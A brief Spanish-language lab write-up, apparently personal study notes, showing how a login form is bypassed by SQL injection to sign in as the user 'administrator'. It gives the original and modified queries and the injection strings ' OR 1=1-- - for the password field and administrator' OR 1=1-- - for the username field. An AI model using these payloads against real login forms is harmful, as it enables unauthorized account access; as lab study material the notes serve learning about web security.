Objetivo: Logearnos como el usuario `administrator`

Consulta Original: `SELECT * FROM users WHERE username='Administrator' AND password=''`

Consulta Modificada: `SELECT * FROM users WHERE username='Administrator' AND password='' OR 1=1-- -'`

Consulta Modificada (Alternativa): `SELECT * FROM users WHERE username='Administrator' OR 1=1-- -' AND password=''`

En el campo password debemos colocar `' OR 1=1-- -` o en el campo de usuario colocar `administrator' OR 1=1-- -` de manera que la qwety sera verdadera.

![[Pasted image 20250717131622.png]]

Y logramos logearnos como el usuario `administrator`

![[Pasted image 20250717131733.png]]
